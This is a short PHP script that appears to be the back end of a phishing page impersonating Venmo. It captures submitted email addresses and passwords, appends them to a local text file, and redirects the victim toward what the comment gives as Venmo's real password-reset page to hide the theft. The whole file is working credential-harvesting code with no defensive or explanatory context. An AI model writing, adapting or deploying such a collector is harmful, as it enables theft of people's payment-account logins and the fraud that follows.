<?php
file_put_contents("usernames.txt", "Venmo Username: " . $_POST['email'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://account.venmo.com/password-reset
header("Location: $url");
exit();
?>